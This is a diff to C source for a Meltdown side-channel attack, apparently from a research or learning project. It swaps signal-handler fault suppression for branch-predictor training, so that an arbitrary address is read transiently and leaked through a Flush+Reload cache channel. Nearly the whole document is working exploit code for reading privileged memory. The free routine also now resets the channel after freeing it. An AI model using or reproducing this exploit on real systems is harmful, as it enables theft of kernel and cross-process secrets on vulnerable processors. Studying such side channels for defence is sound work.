@@ -1,46 +1,25 @@
 #include "meltdown.h"
 #include "fr.h"
-#include <signal.h>
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
-#include <setjmp.h>
 
-
-/// Utils
-jmp_buf jump_after_leak_env;
-
-void sigsegv_handler(int _sig) {
-    // printf("SIGSEGV (%d) caught!\n", sig);
-    longjmp(jump_after_leak_env, 1);
-}
-
-void cause_transient_execution(void) {
-    uint8_t *null_ptr = NULL;
-    *null_ptr = 42;
-}
 
 /// Meltdown attack implementation
 MeltdownUS meltdown_init(void) {
-    struct sigaction sa;
-    sa.sa_handler = sigsegv_handler;
-    sigemptyset(&sa.sa_mask);
-    sa.sa_flags = SA_NODEFER;
-    sigaction(SIGSEGV, &sa, NULL);
-
     const FlushReload channel = fr_init();
     return (MeltdownUS){._channel = channel};
 }
 
 void meltdown_free(MeltdownUS *meltdown) {
     fr_free(&meltdown->_channel);
+    fr_reset(&meltdown->_channel);
 }
 
-uint8_t meltdown_read_any(const MeltdownUS *meltdown, const uint8_t *addr) {
-    fr_reset(&meltdown->_channel);
-
-    if (setjmp(jump_after_leak_env) == 0) {
-        cause_transient_execution();
+void meltdown_read_if_flag_(const MeltdownUS *meltdown, uint8_t *exception_causer, const uint8_t *addr, int flag) {
+    if (flag) {
+        *exception_causer = 42;
         const uint8_t secret = *addr;
         fr_leak(&meltdown->_channel, secret);
 
@@ -48,6 +27,21 @@ uint8_t meltdown_read_any(const MeltdownUS *meltdown, const uint8_t *addr) {
         for (int i = 0; i < 1024; i++) {
         }
     }
+}
+
+uint8_t meltdown_read_any(const MeltdownUS *meltdown, const uint8_t *addr) {
+    // train branch prediction
+    uint8_t valid_byte = 0;
+    for (int i = 0; i < 1024; i++) {
+        meltdown_read_if_flag_(meltdown, &valid_byte, &valid_byte, 1);
+    }
+
+    // misuse trained branch
+    fr_reset(&meltdown->_channel);
+    meltdown_read_if_flag_(meltdown, NULL, addr, 0);
 
     return fr_get(&meltdown->_channel);
 }
+
+
+
